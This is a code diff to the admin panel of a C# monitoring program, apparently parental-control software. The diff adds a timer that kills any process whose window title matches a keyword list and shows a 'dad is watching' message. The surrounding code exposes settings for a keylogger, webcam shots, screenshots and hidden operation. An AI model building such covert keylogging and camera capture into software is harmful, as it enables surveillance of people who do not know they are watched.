@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -22,7 +23,7 @@ namespace Roglaza.Forms
         public FrmAdminPanel(bool allowAccess=false)
         {
             InitializeComponent();
-            SetVisibility(allowAccess); 
+            SetVisibility(allowAccess);
             ghk = new KeyHandler(Keys.PrintScreen, this);
            
             ghk.Register();
@@ -84,6 +85,7 @@ namespace Roglaza.Forms
 
         private void FrmAdminPanel_Load(object sender, EventArgs e)
         {
+
             labelBannerHidden.Visible = false;
             labelBannerHidden.Visible = true;
             labelBannerHidden.Text = MessageStrings.ImHidden;
@@ -101,6 +103,8 @@ namespace Roglaza.Forms
             this.checkBoxScreenShots.Checked = Program.ProgramSettings.AllowScreenShots;
             this.checkBoxCamShots.Checked = Program.ProgramSettings.AllowCamShots;
             this.checkBoxKeyLogger.Checked = Program.ProgramSettings.AllowKeyLogger;
+            this.checkBox_BlockPorno.Checked = Program.ProgramSettings.AllowPornoBlocker;
+
 
             this.textBox_Icon_path.Text = Program.ProgramSettings.RoglazaIconPath;
             try
@@ -376,6 +380,49 @@ namespace Roglaza.Forms
 
         private void button1_Click_1(object sender, EventArgs e)
         {
+
+        }
+
+        private void timer_porn_blocker_Tick(object sender, EventArgs e)
+        {
+            // Credits to 
+            //https://github.com/Kalpeshk9967016292/Antiporn
+
+            try
+            {
+                var proxes = Process.GetProcesses();
+                int myid = Process.GetCurrentProcess().Id;
+                foreach (Process p in proxes)
+                {
+                    string cp = p.MainWindowTitle.ToString();
+                    foreach (string value in MessageStrings.PornMatches)
+                    {
+                        if (cp.Contains(value.ToString())&&cp.Contains("oglaza")==false&&myid!=p.Id)
+                        {
+                            timer_porn_blocker.Stop();
+                            timer_porn_blocker.Enabled = false;
+                            p.Kill();
+                            if (Program.ProgramSettings.showDadMessage)
+                                MessageBox.Show("Sorry I am afraid i can't let you do that " + value.ToString() + " ;","Your dad is watching you");
+                           // Log();
+                            timer_porn_blocker.Enabled = true;
+                            timer_porn_blocker.Start();
+
+                        }
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private void checkBox_BlockPorno_CheckedChanged(object sender, EventArgs e)
+        {
+            if (FormLoaded)
+                Program.ProgramSettings.AllowPornoBlocker = checkBox_BlockPorno.Checked;
+            Program.ProgramSettings.SaveSettings();
+
+            if (Program.ProgramSettings.AllowPornoBlocker)
+                timer_porn_blocker.Start();
 
         }
     }
